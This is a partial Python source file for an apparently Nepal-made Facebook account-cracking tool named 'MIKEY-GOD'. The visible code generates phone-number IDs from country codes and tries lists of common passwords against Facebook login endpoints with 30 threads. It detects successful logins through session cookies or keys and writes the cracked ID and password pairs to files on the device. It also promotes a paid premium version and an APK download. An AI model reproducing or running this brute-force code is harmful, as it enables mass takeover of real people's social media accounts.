...
----------------------------------------------
 Author    : MIKEY HU
 FACEBOOK LINK     : https://www.facebook.com/harmane.dada
 Github    : MIKEY-DON
 Facebook  : Th'w MI KEY🤍🕊️?️
 Tool Name : MIKEY-GOD
 Type type : 50 rs dinu parxw babe haru😶💗
 Version   : TEST
----------------------------------------------
 MIKEY-GOD version test
 For Haters: BAU HOO MIKEY DAII .ENJOYYY H4N KTAA HOO🤞
\033[1;37m----------------------------------------------""")
def linex():
        print('\033[1;37m----------------------------------------------')
def clear():
...
def public():
        ...
        try:
                ...
                try:
                        ...
                        ps_limit =1
                linex()
                print('\033[1;32m exp: first last,firtslast,first123,first12345,first@123,last123,last@123,first321,first@321,firstlast123,firstlast123,')
                linex()
...
def menu():
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                clear()
                                print(' Put file example:  /sdcard/MIKEY.txt  etc..')
                                linex()
                                ...
                                os.system('xdg-open https://mediafire.com/file/y1wvgc2zqqunxbn/MIKEY_VPN1.0.apk/file');menu()
                        elif xd in ['8','08']:
                        ...
                        linex()
                        tks = ("Hi MIKEY Sir, I Need To Buy Your Paid MIKEY-GOD Tools Version 1.9.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
                        subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
                        print(' Run :  python MIKEY.py')
                        exit()
        except ValueError:
                exit()
        except requests.exceptions.ConnectionError:
...
def pak():
                ...
                for nmbr in range(limit):
                        ...
                        user.append(nmp)
                with tred(max_workers=30) as MIKEY:     
                        clear()
                        tl = str(len(user))
                        ...
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'nepalnepal','nepal1122','nepal12345','nepal1234','nepal12','khan786','freefire123','khan123456','khankhan123','786786']
                                MIKEY.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
...
def bd():
                user=[]
                clear()
                print('\033[1;31m Code example: 9842,9824,9767,9824')
                code = input('\033[1;37m put code: ')
                try:
                        limit = int(input('\033[1;31m example: 2000, 3000, 5000, 10000\n\033[1;37m put limit: '))
                except ValueError:
                ...
                with tred(max_workers=30) as MIKEY:     
                        ...
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'freefire123','nepal123','i love you','iloveyou','free fire','freefire']
                                MIKEY.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
...
def gmail():
                ...
                clear()
                print('\033[1;37m example: raxonn, rai, limbu, rigalkarki\033[1;97m')
                linex()
                first = input(' Put first name: ')
                linex()
                print('\033[1;37m example: magar, shrestha, nikhil \033[1;97m')
                linex()
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [MIKEY-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        MIKEY=session.cookies.get_dict().keys()
                        if "c_user" in MIKEY:
                                coki=session.cookies.get_dict()
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print('\r\r\033[1;32m [MIKEY-OK] %s | %s'%(ids,pas))
                                open('/sdcard/MIKEY-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in MIKEY:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [MIKEY-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/MIKEY-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
    ...
    "user-agent": ua,
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [MIKEY-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/MIKEY-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
...
def rndm(ids,passlist):
    ...
    "user-agent": ua,
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/MIKEY-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [MIKEY-OK] '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/MIKEY-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [MIKEY-OK] '+uid+' | '+pas+'\033[1;97m')
